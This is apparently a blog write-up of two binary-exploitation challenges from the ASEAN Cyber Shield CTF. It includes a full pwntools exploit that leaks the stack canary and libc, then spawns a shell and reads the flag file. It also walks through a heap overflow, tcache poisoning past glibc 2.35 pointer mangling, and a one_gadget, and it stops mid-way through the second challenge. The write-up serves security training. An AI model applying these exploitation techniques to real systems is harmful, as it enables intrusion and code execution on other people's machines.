[{"content":" Overview My team Copi Kincau (comprised of Firdaus, Teng, Raihan, and me) was one of 4 teams that represented Malaysia in this year\u0026rsquo;s ASEAN Cyber Shield. We travelled to Ha Long Bay, Vietnam during November to play in the ctf, and managed to get 3rd in the student category!\nThe ctf was organised by KISA, and had teams from all the ASEAN countries. It had some difficult and high quality pwn challs, and I\u0026rsquo;ll be sharing the writeups of two of them in this post.\n(was busy, so post is almost a month late)\nAll attachments can be found here.\nSpecial thanks to RE:HACK and NACSA for selecting us to represent Malaysia and the support given by them throughout the contest.\na drop of tear (pwn) I was really happy that I solved this one since only 2 teams out of all 37 teams in the preliminary solved it!\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c // from ghidra decompilation void init(void){ local_14 = open(\u0026#34;/home/acs_ctf/flag\u0026#34;,0); read(local_14,\u0026amp;local_18,4); srand(local_18); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stdout,(char *)0x0,2,0); signal(0xe,exit); signal(0xb,correct_indicate); alarm(0x78); return; } undefined8 main(void){ ... local_10 = *(long *)(in_FS_OFFSET + 0x28); init(); local_134 = 0; local_128[0] = 0xdeadbeef; local_128[1] = 0xcafebabe; local_128[2] = 0x1337c0d3; local_128[3] = 0x79427942; ... do { puts(\u0026#34;a drop of tear makes me relieved.\u0026#34;); local_134 = get_signedint(\u0026amp;local_134); if (local_134 == 0x10001) { guessed_num(); } else { if ((int)local_134 \u0026lt; 0x10002) { if (local_134 == 0x67) { puts(\u0026#34;one drop of tear will be dropped.\u0026#34;); exit(0); } if ((int)local_134 \u0026lt; 0x68) { if (local_134 == 0x65) { puts(\u0026#34;test your luck.\u0026#34;); __isoc99_scanf(\u0026#34;%c\u0026#34;,\u0026amp;local_130); getchar(); if (0x44 \u0026lt; local_130) { puts(\u0026#34;wrong choice\u0026#34;); exit(-1); } local_130 = local_128[(int)((local_130 \u0026amp; 0xff) - 0x41)]; //\u0026lt;-- NEGATIVE INDEX VULN puts(\u0026#34;what if choice is.....?\u0026#34;); __isoc99_scanf(\u0026#34;%c\u0026#34;,\u0026amp;local_135); getchar(); if (local_135 == \u0026#39;/\u0026#39;) { puts(\u0026#34;divided by...?\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_12c); getchar(); local_130 = (int)local_130 / local_12c; } else { if (local_135 \u0026lt; \u0026#39;0\u0026#39;) { if (local_135 == \u0026#39;-\u0026#39;) { puts(\u0026#34;minus...?\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_12c); getchar(); local_130 = local_130 - local_12c; } else { if (local_135 \u0026lt; \u0026#39;.\u0026#39;) { if (local_135 == \u0026#39;*\u0026#39;) { puts(\u0026#34;multiply...?\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_12c); getchar(); local_130 = local_12c * local_130; } else { if (local_135 == \u0026#39;+\u0026#39;) { puts(\u0026#34;plus...?\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_12c); getchar(); local_130 = local_12c + local_130; } } } } } } uVar1 = rand(); if (uVar1 == local_130) { puts(\u0026#34;Correct! wow..\u0026#34;); guessed_num(); } else { puts(\u0026#34;..?\u0026#34;); } goto LAB_00101a39; } if (local_134 == 0x66) { puts(\u0026#34;test your exploit skill.\u0026#34;); read(0,\u0026amp;local_118,0x140); // \u0026lt;----- BUFFER OVERFLOW HERE if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; } __stack_chk_fail(); } } } printf(\u0026#34;%d is wrong choice.\\n\u0026#34;,(ulong)local_134); } LAB_00101a39: puts(\u0026#34;\u0026#34;); } while( true ); } void get_signedint(char *param_1){ read(0,param_1,4); atoi(param_1); return; } void guessed_num(void){ long in_FS_OFFSET; uint local_20; uint local_1c; int local_18; int local_14; long local_10; local_18 = open(\u0026#34;/home/acs_ctf/flag\u0026#34;,0); read(local_18,\u0026amp;local_20,4); close(local_18); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_1c); if (local_20 != local_1c) { puts(\u0026#34;Wrong!\u0026#34;); exit(-1); } puts(\u0026#34;Correct\u0026#34;); local_14 = open(\u0026#34;/home/acs_ctf/flag\u0026#34;,0); read(local_14,\u0026amp;local_1c,4); local_1c = local_1c \u0026amp; 0xffffff; printf(\u0026#34;Of course, you are playing %s CTF, right?\\n\u0026#34;,\u0026amp;local_1c); close(local_14); return; } Reversing The binary loads the first 4 bytes of /home/acs_ctf/flag as the rand() seed.\nIt then goes into an infinite loop requesting user input to select options:\n101: guess the random number 102: buffer overflow then return from main 103: exit() 65537: guessed_num() How option 101 works is one byte of user input is requested, and that byte is used to index array local_128 through local_128[one_byte_input-0x41)];.\nlocal_128 is also populated at the start of the process:\nlocal_128[0] = 0xdeadbeef; local_128[1] = 0xcafebabe; local_128[2] = 0x1337c0d3; local_128[3] = 0x79427942; So if you enter \u0026lsquo;A\u0026rsquo;, index 0 is used, and your current guess is 0xdeadbeef.\nYou can then perform basic arithmetic operations +-*/ on your guess, and that final guess will be used to be compared with the random number generated by rand().\nSo if you had 0xdeadbeef as your guess, you could +1 to it, and make it 0xdeadbef0.\nIf your guess was correct, guessed_num() would be called.\nWhat guessed_num() does is just ask for the first 4 bytes of /home/acs_ctf/flag, and outputs those bytes out again if you get it right.\nYou can directly call the guessed_num() function by using option 65537, but idt its possible to use that option since the program just reads 4 byte from the user for choosing options.\nOption 102 is just a classic bof, but there\u0026rsquo;s a canary and PIE stopping you, so there\u0026rsquo;s not much you can do with just that.\nVulnerabilities The flag format of the ctf is ACS{...}, so the seed of rand() was just ACS{.\nThus you can always predict what the correct answer is.\nThere is also a negative index vuln in the number guessing option:\nlocal_128[one_byte_input-0x41)]; where you can enter bytes smaller than 0x41 to access values before the array.\nThis is how the array looks in memory:\n0x7fffffffe0f8: 0x8e9331be0e56d100 \u0026lt;- canary ... 0x7fffffffe138: 0x00007ffff7e3dee3 \u0026lt;_IO_file_overflow+259\u0026gt; \u0026lt;- libc address ... 0x7fffffffe1c8: 0x00000001deadbef0 \u0026lt;- your guess (0xdeadbef0) 0x7fffffffe1d0: 0xcafebabedeadbeef \u0026lt;- local_128 0x7fffffffe1d8: 0x794279421337c0d3 ... This means that you can use negative indexes to access your previous guess, the canary, and libc address, and use them as your current guess.\nKeep in mind tho that you don\u0026rsquo;t get to directly input the indexes, and have to input a byte that is first subtracted with 0x41, then only be used to index local_128. So if I input byte \\x0b, the array will be indexed through local_128[0xb-0x41], and the first 4 bytes of the canary will be used as our current guess.\nAnd memory will look like this:\n... 0x7fffffffe1c8: 0x000000010e56d100 \u0026lt;- your current guess before any +-*/ is performed 0x7fffffffe1d0: 0xcafebabedeadbeef \u0026lt;- local_128 0x7fffffffe1d8: 0x794279421337c0d3 ... Ok nice, so we can use either the canary or libc addresses as our guess, what can we do with that?\nWe can actually use this to leak canary and libc, and once we have those values, we can just ret2libc using option 102.\nBut how do we actually leak values using number guessing?\nLeaking Since we know the random seed, we always know what the correct guess is.\nIf we take the canary as our random guess, and shift it 31 bits to the left, leaving the LSB of the canary as the MSB of our guess. Then setup the rest of the 31 bits to be same as the correct guess. We will know that the LSB of the canary, is same as the MSB of the correct guess, if our guess was correct and guessed_num() is called. If our guess was incorrect, then we know that the LSB bit of the canary is the opposite of the MSB bit of the correct guess.\nExample:\n(everything is represented in bits, and scaled down to 8 bits for simplicity of example) ITERATION 1: rand num: ... canary: 10101010 guess: 10101010 \u0026lt;- access canary using negative index multiply 2**7 to shift guess 7 bits to the left guess: 00000000 ITERATION 2: rand num: 11110000 guess: 00000000 \u0026lt;- access back previous guess add 7 bits of the correct guess guess: 01110000 OUTCOME OF ITERATION 2: wrong guess Thus we know that largest bit of our guess is wrong, and is NOT 1. So the smallest bit of the canary, is 0. When we want to brute the next bit, we just shift one less bit to the left, so shift 6 bits, and do the same thing. We just have to do some slight calculations to correctly setup the other 7 bits of the correct guess.\nExample:\nlet\u0026#39;s say you found out the last bit of the canary to be 1, when you shift the canary 6 bits to the left, you know that: guess: ?1000000 during the next iteration of the infinite loop, say rand num: 00001111 guess: ?1000000 to setup the rest of the 7 bits of your guess, you have to subtract 15 from guess guess: ?0001111 Through this, we can brute the canary and libc bit by bit, and we can then just ret2libc!\nYou just need time to brute, and my exploit took a little under 2 mins to run on the remote server.\nexploit.py:\nfrom pwn import * from ctypes import CDLL #io = process(\u0026#34;./tear\u0026#34;,aslr=True) io = remote(\u0026#34;10.100.0.43\u0026#34;,10002) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) cdll_libc = CDLL(\u0026#39;libc.so.6\u0026#39;) cdll_libc.srand(0x7b534341) def brute_bit(s): # to use this func, bit alr has to be setup # only DONT change MSB state = s cur_rand = cdll_libc.rand() target = cur_rand \u0026amp; 0x7fffffff state = (state\u0026amp;0x7fffff00) + ord(\u0026#39;?\u0026#39;) diff = abs(target-state) if (target \u0026gt; state): io.sendlineafter(b\u0026#34;relieved.\u0026#34;,b\u0026#34;101\u0026#34;) io.sendlineafter(b\u0026#34;luck\u0026#34;,b\u0026#34;?\u0026#34;) # to choose back guess io.sendlineafter(b\u0026#34;choice\u0026#34;,b\u0026#34;+\u0026#34;) io.sendlineafter(b\u0026#34;plus...?\u0026#34;,str(diff).encode()) else: io.sendlineafter(b\u0026#34;relieved.\u0026#34;,b\u0026#34;101\u0026#34;) io.sendlineafter(b\u0026#34;luck\u0026#34;,b\u0026#34;?\u0026#34;) io.sendlineafter(b\u0026#34;choice\u0026#34;,b\u0026#34;-\u0026#34;) io.sendlineafter(b\u0026#34;minus...?\u0026#34;,str(diff).encode()) resp = io.recvuntil(b\u0026#34;..\u0026#34;) if b\u0026#34;wow\u0026#34; in resp: # bit matches the rand io.sendline(b\u0026#34;2069054273\u0026#34;) # have to do this for some reason io.sendlineafter(b\u0026#34;relieved.\u0026#34;,b\u0026#34;101\u0026#34;) io.sendlineafter(b\u0026#34;luck\u0026#34;,b\u0026#34;A\u0026#34;) io.sendlineafter(b\u0026#34;choice\u0026#34;,b\u0026#34;-\u0026#34;) cdll_libc.rand() return cur_rand \u0026gt;\u0026gt; 31 else: # bit does not match the rand return not (cur_rand \u0026gt;\u0026gt; 31) # realised when writing the writeup that this should be name dword, not qword def brute_qword(idx,start_bit,end_bit,known=0): # brute start bit - end bit, inclusive qword = known for i in range(start_bit,end_bit+1): # load the ptr we want to leak # multiply 2**n shift n bytes to left io.sendlineafter(b\u0026#34;relieved.\u0026#34;,b\u0026#34;101\u0026#34;) io.sendlineafter(b\u0026#34;luck\u0026#34;,idx.to_bytes(1,\u0026#34;little\u0026#34;)) io.sendlineafter(b\u0026#34;choice\u0026#34;,b\u0026#34;*\u0026#34;) io.sendlineafter(b\u0026#34;multiply...?\u0026#34;,str(2**(31-i)).encode()) cdll_libc.rand() new_bit = brute_bit(qword \u0026lt;\u0026lt; (31-i)) qword = (new_bit\u0026lt;\u0026lt;i) + qword log.info(\u0026#34;QWORD BRUTED\u0026#34;) return qword canary = (brute_qword(0xc,0,31)\u0026lt;\u0026lt;32) + (brute_qword(0xb,8,31)) log.info(\u0026#34;CANARY: \u0026#34; + hex(canary)) libc.address = (brute_qword(0x1c,0,15)\u0026lt;\u0026lt;32) + brute_qword(0x1b,8,31,known=0xe3) - libc.symbols[\u0026#34;_IO_file_overflow\u0026#34;] - 259 log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) pop_rdi = p64(libc.address + 0x10f75b) ret = p64(libc.address + 0x10f75c) ret2libc = b\u0026#34;A\u0026#34;*0x108 + p64(canary) + p64(0) + ret ret2libc += pop_rdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(b\u0026#34;relieved.\u0026#34;,b\u0026#34;102\u0026#34;) io.sendlineafter(b\u0026#34;skill.\u0026#34;,ret2libc) io.sendline(b\u0026#34;cat /home/acs_ctf/flag\u0026#34;) io.interactive() vote your favourite ctf! (pwn) I was really really really close to solving this in the finals, but I ran out of time. Would\u0026rsquo;ve been really satisfying to solve it but even if I did, we\u0026rsquo;d still be 3rd. Also iirc only 2/10 teams solved it.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled LIBC: GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. src.c\nReversing It\u0026rsquo;s a C++ binary, where you can insert ctf names and vote ctfs.\nadd your favorite ctfs! 1. add ctf 2. vote ctf 3. remove ctf 4. exit input: Each ctf is stored as an object in the heap.\nThe addresses of these objects are stored in a global array which I named ctfs_arr.\nEach ctf object is 0x958 bytes, and has properties:\n- name - topics - photo width - photo height - photo - photo magic value Which are all set when you add a ctf.\nThe name is just a 31 byte C string and is always asked for, but the topics and photo is compulsory.\nIf you do choose to write topics, the amount of topics is requested (must be \u0026lt; 6).\nTopic names are then read in as C++ basic_strings, and stored in a C++ vector.\n(I actually didn\u0026rsquo;t know that they\u0026rsquo;re stored in vectors until after the ctf, more on this later)\nIf you choose to give a photo, the width and height of the photo is requested, both of which are shorts and must be \u0026lt; 0x30. Then, width*height bytes is read in as the photo, through:\nread(0,pvVar3,(long)((int)height * (int)width)); A magic value based on the photo is also generated, and stored at object+0x938.\nvoid set_magic(long obj){ long lVar1; lVar1 = generate_magic(obj); /* if magic is not 0x1337133713371337, then set the magic */ if (lVar1 != 0x1337133713371337) { *(long *)(obj + 0x938) = lVar1; } return; } // just go through every byte of photo and magic = byte + magic*0x17 long generate_magic(long obj){ short j; long local_10; local_10 = 0x1337133713371337; j = 0; while (((((int)j \u0026lt; (int)*(short *)(obj + 0x16) * (int)*(short *)(obj + 0x14) \u0026amp;\u0026amp; (-1 \u0026lt; *(short *)(obj + 0x14))) \u0026amp;\u0026amp; (-1 \u0026lt; *(short *)(obj + 0x16))) \u0026amp;\u0026amp; (j \u0026lt; 0x900))) { local_10 = (long)*(char *)(obj + 0x38 + (long)(int)j) + local_10 * 0x17; j = j + 1; } return local_10; } Once you finish making a ctf, the photo is rendered and printed onto the screen.\nThe photo is just a bunch of *s and .s, having char \u0026lsquo;1\u0026rsquo; being a *, and the rest being ..\nThe raw bytes of the photo is also printed through printf(\u0026quot;... %s\\n\u0026quot;,...);\nThe ctf objects looks something like this in memory:\n0x55555556feb0: 0x000055555555bc80 \u0026lt;- pie readonly address storing funcptr 0x55555556feb8: 0x00000000 \u0026lt;- votes 0x55555556febc: 0x00000001 \u0026lt;- has_photo boolean 0x55555556fec0: 0x00000000 0x55555556fec4: 0x0010 \u0026lt;- photo width 0x55555556fec6: 0x0020 \u0026lt;- photo height 0x55555556fec8: 0x00000072656d6167 \u0026lt;- name ... 0x55555556fee8: 0x3231333231333231 \u0026lt;- photo bytes ... 0x5555555707e8: 0x6b55ee1041d66d0f \u0026lt;- magic 0x5555555707f0: 0x0000555555570840 \u0026lt;-| 0x5555555707f8: 0x0000555555570880 |- topics vector stuff 0x555555570800: 0x0000555555570880 \u0026lt;-| ------------------------------------------------------------------------------------------ more on the pie readonly address: 0x000055555556feb0: 0x000055555555bc80 → 0x0000555555558522 → endbr64 #The vector object is also allocated in the heap as a chunk more on the vector object: 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 0x555555570860: 0x0000555555570870 0x0000000000000004 0x555555570870: 0x0000000042424242 0x0000000000000000 0x555555570880: 0x0000000000000000 Im pretty sure the vector ptrs in the ctf object are just the vector startptr and endptr: 0x5555555707f0: 0x0000555555570840 0x5555555707f8: 0x0000555555570880 0x555555570800: 0x0000555555570880 (this ptr is diff when there\u0026#39;s 3 elements tho) Inside the vector, the string / char ptr is stored, followed by the length of the str, then the actual bytes of the string: 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 When you choose option 2 (vote a ctf), all ctf\u0026rsquo;s name, photo render, and topic names will be printed.\nThe magic number of all the ctfs with photos will be checked as well, and the process will exit if any magic numbers are wrong.\nulong check_magic(long param_1){ ulong uVar1; ulong uVar2; uVar1 = *(ulong *)(param_1 + 0x938); uVar2 = generate_magic(param_1); return (uVar1 == uVar2); } Once you vote a ctf, their total votes will +1.\nWhen you choose option 3, and choose a ctf to remove by giving its index, the magic check will be done on the ctf as well. Once it passes the check, the address at **ctf_object will be called, with ctf_object being its argument. So:\nctf_object = 0x000055555556feb0; 0x000055555556feb0: 0x000055555555bc80 → 0x0000555555558522 → endbr64 $rip: 0x0000555555558522 $rdi: 0x000055555556feb0 I didn\u0026rsquo;t really reverse the function at 0x0000555555558522, but after its called, the vector object and the ctf object is freed. Afterwards the ctf object ptr is nullified in the ctf_arr list (so no UAF).\nWhen you choose option 4, the ctf with the most votes is declared the winner, and main() returns afterwards.\nVulnerabilities When making a new ctf, you can enter negative width and height:\nprintf(\u0026#34;width? \u0026#34;); __isoc99_scanf(\u0026#34;%hd\u0026#34;,\u0026amp;width); printf(\u0026#34;height? \u0026#34;); __isoc99_scanf(\u0026#34;%hd\u0026#34;,\u0026amp;height); getchar(); // the comparisons here are done with instrs jg and jle, which are signed comparisons // thus negative values of width and height will be false for these comparisons if ((0x2f \u0026lt; width) || (0x2f \u0026lt; height)) { exit(-1); } set_obj_width(*(undefined8 *)(\u0026amp;ctfs_arr + (long)idx * 8),(int)width); set_obj_height(*(undefined8 *)(\u0026amp;ctfs_arr + (long)idx * 8),(int)height); With that, you can read as many bytes as you want in:\nread(0,pvVar3,(long)((int)height * (int)width)); Since you can enter any negative height and width, and negative multiplied with negative is positive, you can read any amount of bytes into the photo property of the ctf objects.\nHowever, the binary tries to prevent this by using the magic value.\nlong generate_magic(long obj){ short j; long local_10; local_10 = 0x1337133713371337; j = 0; while (((((int)j \u0026lt; (int)*(short *)(obj + 0x16) * (int)*(short *)(obj + 0x14) \u0026amp;\u0026amp; (-1 \u0026lt; *(obj + 0x14))) \u0026amp;\u0026amp; (-1 \u0026lt; *(obj + 0x16))) \u0026amp;\u0026amp; // \u0026lt;- negative values fails this (j \u0026lt; 0x900))) { local_10 = (long)*(char *)(obj + 0x38 + (long)(int)j) + local_10 * 0x17; j = j + 1; } return local_10; } // the test and js instructions are used to check if *(obj+0x14) and *(obj+0x16) are negative // test sets the sign flag if they\u0026#39;re negative, and js jumps if sign flag is set Because of the negative width and height, we won\u0026rsquo;t execute the code in the while loop at all, and generate_magic() will return 0x1337133713371337.\nThus set_magic() won\u0026rsquo;t set the magic property of the ctf object:\nvoid set_magic(long obj){ long lVar1; lVar1 = generate_magic(obj); // if lVar1 == 0x1337133713371337, do nothing if (lVar1 != 0x1337133713371337) { *(long *)(obj + 0x938) = lVar1; } return; } The magic property of the ctf object will be null.\nThis becomes a problem when you try to vote or delete the ctf object, as it will fail the magic check:\nulong check_magic(long param_1){ ulong uVar1; ulong uVar2; uVar1 = *(ulong *)(param_1 + 0x938); uVar2 = generate_magic(param_1); // uVar1 will be 0, uVar2 will be 0x1337133713371337 // so this will return false, and process will terminate return (uVar1 == uVar2); } However, the magic property is stored below the photo property of the object, which you have unlimited write to. So you can just overflow the photo property, and write 0x1337133713371337 as the magic yourself!\nWith that, you have unlimited overflow in the heap, giving you the ability to overwrite the topics vector of the object, and also any heap chunk that is below the object. But before we can pop a shell, we will need some memory leaks.\nLeaking Since this is how the binary prints out the raw bytes of the photo after you make a ctf:\nuVar4 = get_photo(*(\u0026amp;ctfs_arr + idx*8)); // address of obj\u0026#39;s photo will be returned printf(\u0026#34;photo format : %s\\n\u0026#34;,uVar4); And the photo is followed by the magic, which is then followed by a heap address (topics vector):\n0x55555556fee8: 0x3231333231333231 \u0026lt;- photo bytes ... 0x5555555707e8: 0x1337133713371337 \u0026lt;- magic 0x5555555707f0: 0x0000555555570840 \u0026lt;- heap addr The heap addr is leaked when you completely fill up the photo buf,and setup the magic properly:\nAAAAAAAAAAA...\\x37\\x13\\x37\\x13\\x37\\x13\\x37\\x13heap_leak\\x00 Since there\u0026rsquo;s no null bytes to terminate the string before the heap address.\nAs for leaking libc, and other values, I used the topics of the object.\nI actually didn\u0026rsquo;t know that the topic names are stored in a vector during the finals, since I didn\u0026rsquo;t really reverse the functions that are used to handle topics. I took more of a dynamic analysis approach to seeing how the topics are stored, by playing with them and viewing them in memory.\nWhat I saw was that when you have one topic:\n... rest of ctf obj ... 0x5555555707f0: 0x0000555555570810 \u0026lt;- startptr 0x5555555707f8: 0x0000555555570830 \u0026lt;- endptr 0x555555570800: 0x0000555555570830 \u0026lt;- endptr 0x555555570808: 0x0000000000000031 \u0026lt;- new heap chunk 0x555555570810: 0x0000555555570820 \u0026lt;- char ptr 0x555555570818: 0x0000000000000004 \u0026lt;- number of bytes 0x555555570820: 0x0000000041414141 \u0026lt;- actual bytes 0x555555570828: 0x0000000000000000 A 0x30 heap chunk would be allocated, having a char ptr in it that points to chunk+0x10.\nAnd the ctf object will have pointers pointing to the start and end of this chunk.\nSince we can overflow the ctf object, we could overwrite the start and end ptrs to point to memory we control (can freely write), and craft our fake chunk there. By setting up a pointer in that fake chunk, we can get arbitary read when we print the topic names.\nTo do all this, we have to know at what address the memory we control is, and also the address which its contents we want to leak. Thanks to the heap leak before, we know the addresses of our ctf objects (and its properties), and also we can leak any value that is stored inside the heap.\nIn smaller binaries like this, as long as you have a heap leak, you can calculate the heap base, and from then on you\u0026rsquo;ll know where everything in the heap is. Since there\u0026rsquo;s very little mallocs and frees called, and the places where they are called are the same everytime the binary is ran, the heap layout is very predictable.\nSo an example of leaking through topics:\n... 0x55555556ff10: addr \u0026lt;- whatever addr that we want to leak its contents, so leak *addr 0x55555556ff18: 0x8 ... 0x5555555707f0: 0x55555556ff10 \u0026lt;- overwrote to point to some photo bytes of own obj 0x5555555707f8: 0x55555556ff30 \u0026lt;- overwrote endptr to startptr+0x20 0x555555570800: 0x55555556ff30 With this, we can leak any *addr, as long as we know addr!\nCurrently, with PIE and everything, we only know heap addresses.\nHow can we leak libc? Is there any libc addresses inside the heap?\nWe can just free a large enough chunk, so that it goes into the unsorted bin. That way the chunk will have a double linked list that contains a libc pointer.\nto learn more about binning.\nThe ctf object is perfect for this, since its 0x958 bytes, large enough to just go straight into the unsorted bin when freed. Remember tho to put a chunk between the unsorted bin chunk and the wilderness to prevent consolidation.\nWith that, we have heap and libc leak, as well as arbitary read into any heap and libc addr.\nif pwndbg heap commands doesn\u0026rsquo;t work, you just have to use heap set-arena to tell it where main_arena is. You can find out where the main_arena is by using the address in unsorted bin chunks, as it is main_arena+0x60.\nExploitation I first tried overwriting the address which stored a function ptr (placed at the start of the ctf object), to an address I control, which has a one_gadget in it. But the one_gadgets didn\u0026rsquo;t work.\nThen, I went for a tcache poisoning attack, which is essentially just overwriting the fd ptr of chunks in tcache bin:\n# pointer mangling not shown for simplicty before corruption: Tcachebin[idx=2,size=0x30]: 0x555555570910 -\u0026gt; 0x555555570940 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: 0x555555570940 (fd) 0x0000000000000000 0x555555570920: ... 0x555555570930: 0x0000000000000000 0x0000000000000031 0x555555570940: ... ... so when a 0x30 chunk is requested, 0x555555570910 will be allocated first. then when another 0x30 chunk is requested, 0x555555570940 will be allocated next, as it follows the fd ptr of the 0x555555570910 chunk after corruption: Tcachebin[idx=2,size=0x30]: 0x555555570910 -\u0026gt; addr 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: addr (fd) 0x0000000000000000 0x555555570920: ... when a 0x30 chunk is requested, 0x555555570910 is allocated first. But for the next allocation, addr will be allocated, as its the fd of 0x555555570910 chunk It\u0026rsquo;s important to note however that we\u0026rsquo;re using glibc 2.35, and pointer mangling is done on the fd pointers:\n// from https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L340 #define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) \u0026gt;\u0026gt; 12) ^ ((size_t) ptr))) So in reality, the tcache chunks look something like this:\nTcachebin[idx=2,size=0x30]: 0x555555570910 -\u0026gt; 0x555555570940 0x555555570900: 0x0000000000000000 0x0000000000000031 0x555555570910: 0x555000025c30 (fd) 0x0000000000000000 0x555555570920: ... 0x555555570930: 0x0000000000000000 0x0000000000000031 0x555555570940: ... ... mangling: (0x555555570910\u0026gt;\u0026gt;12)^0x555555570940 = 0x555000025c30 So whenever we want to overwrite the fd pointer, we have to remember to mangle our address:\ndef mangle(dest,pos): return (pos \u0026gt;\u0026gt; 12) ^ dest When you allocate a 0x20 byte topic, the bytes aren\u0026rsquo;t just stored in the vector object like when you allocate less bytes, but instead another chunk is allocated specifically for the topic name:\nwhen you allocate a 0x4 byte topic: 0x555555570830: ... 0x0000000000000031 0x555555570840: 0x0000555555570850 0x0000000000000004 0x555555570850: 0x0000000041414141 0x0000000000000000 when you allocate a 0x20 byte topic: heap chunk: 0x555555572ec0: ... 0x0000000000000031 0x555555572ed0: 0x0000555555572f00 ... 0x555555572ee0: ... heap chunk: 0x555555572ef0: 0x0000000000000000 0x0000000000000031 0x555555572f00: 0x4141414141414141 0x4141414141414141 0x555555572f10: 0x4141414141414141 0x4141414141414141 So using this, you can get two 0x30 chunks side by side, and will free both of them when you delete the ctf object, giving you the ability to setup the heap so that:\n------------------- | free ctf obj | \u0026lt;- (next ctf object allocation) ------------------- | free 0x30 chunk | \u0026lt;- tcache will allocate this first if 0x30 chunk is requested ------------------- | free 0x30 chunk | \u0026lt;- then this ------------------- Before I tried to get this setup, I made sure there were nothing in the free lists to make things easier. Also like I said before, I didn\u0026rsquo;t fully reverse the topics functions, so sometimes there\u0026rsquo;s unexpected chunks that are suddenly allocated/freed, so I just had to play around with it a bit to get this configuration.\nWith that, when we allocate the next ctf object, we can overflow the free 0x30 chunk, and overwrite its fd pointers with what we want. Remember to not give any topics since that\u0026rsquo;ll mess up the setup.\nallocate ctf obj and overflow fd: -------------------------------- | ctf_obj | -------------------------------- | free 0x30 chunk, fd=own_addr | \u0026lt;- tcache will give this first when 0x30 chunk is requested -------------------------------- | free 0x30 chunk | -------------------------------- tcache will give own_addr next when another 0x30 chunk is requested So when we make another ctf object, this time with a 0x20 byte topic, a 0x30 chunk will be requested to setup the vector object, and the chunk which has its fd overwritten will be returned. When another 0x30 chunk is requested to store our 0x20 byte topic name, the addr which we overwrote fd with will be returned, and we will achieve arbitary overwrite.\nThe only criteria for the addr to overwrite fd with is that it is 0x10 bytes aligned, otherwise heap security checks will be triggered. (I\u0026rsquo;m pretty sure tcache is meant for fast allocation, so there\u0026rsquo;s pretty few security checks. For example tcache doesn\u0026rsquo;t check if the heap metadata header of the to-be-allocated chunk is set properly.)\nOnly question is now is, what do we overwrite?\nI chose to just leak the stack by leaking the environ variable in libc using the method shown above, and overwrite the ret pointer of add_ctf():\n0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0 \u0026lt;---- overwrite from here 0x00007fffffffe2a8│+0x0008: 0x00005555555572b6 ← $rsp 0x00007fffffffe2b0│+0x0010: 0x0000000100000000 0x00007fffffffe2b8│+0x0018: 0x5098e54495573500 0x00007fffffffe2c0│+0x0020: 0x0000000000000001 ← $rbp environ is a variable in libc that stores where the start of the environment variables are in the stack. I\u0026rsquo;m pretty sure the difference in environment variables is what makes stack offsets different in remote and local. So the ret ptrs (which are above environ) are all at the same offsets relative to environ across remote and local, since all the noise of the stack happens after environ.\nand well this is where I got stuck in the finals The overwrite worked perfectly when I tried overwriting with 0x20 As, but failed when I tried to ret2libc, and overwrite with:\np64(0) + pop_rdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) I thought it failed because the topic name was read in through C++ \u0026gt;\u0026gt;, and it couldn\u0026rsquo;t read null bytes. Or maybe a strlen was used in determining the malloc size, and having a null byte in it made it so that not a 0x30 byte chunk was used. So another chunk is allocated elsewhere, not at the place we want.\nI actually tried to overwrite exit_handlers, and leak the pointer_guard using the topics method before I tried doing ret2libc, but that faced the same overwrite problem as well.\nIn the end, I ran out of time, and didn\u0026rsquo;t solve this challenge.\nAfter the ctf, I tried the challenge again, and played around with this more.\nI tried overwriting with 0x20 null bytes to see if the overwrite will work, and to my surprise, it did!\nI investigated more, and turns out, the overwrite failed because my pop rdi gadget was at the address 0x1555550bd3e5, and the overwrite failed everytime it encountered a \\x0b byte. The gadget was always at that address too since I turned ASLR off using pwntools when testing.\nWhen I tried it with 0x15555541d3e5, the overwrite worked. So there\u0026rsquo;s no problems writing pointers, except for some with bad bytes like \\x0b.\nIn hindsight, I probably should have tested the C++ \u0026gt;\u0026gt; thing by using the binary normally and making some topics with null bytes, before going ahead with my assumptions. But well, there was very little time left when I faced this problem, and was just throwing stuff to see what works.\nAlso, it could have been because I wasn\u0026rsquo;t using the libc given , but was using my local libc (which is also glibc 2.35, just not the same one).\nI first tried to do a ret2libc, but was faced with the movaps issue. I couldn\u0026rsquo;t write an extra ret gadget to deal with it too since I couldn\u0026rsquo;t write one more pointer, as that will make the overwrite not work. (Since then its not a 0x30 chunk that\u0026rsquo;s allocated anymore.)\nI then tried to setup a gets() call to further write the rop chain, but that didn\u0026rsquo;t work as well.\nIn the end, I managed to use this one_gadget:\n0x50a37 posix_spawn(rsp+0x1c, \u0026#34;/bin/sh\u0026#34;, 0, rbp, rsp+0x60, environ) constraints: rsp \u0026amp; 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL Before the ret instruction of add_ctf() is executed, there is a pop rbp instruction:\n→ 0x555555556c2d pop rbp 0x555555556c2e ret 0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0 → 0x0000000000000001 ← $rsp, $rbp 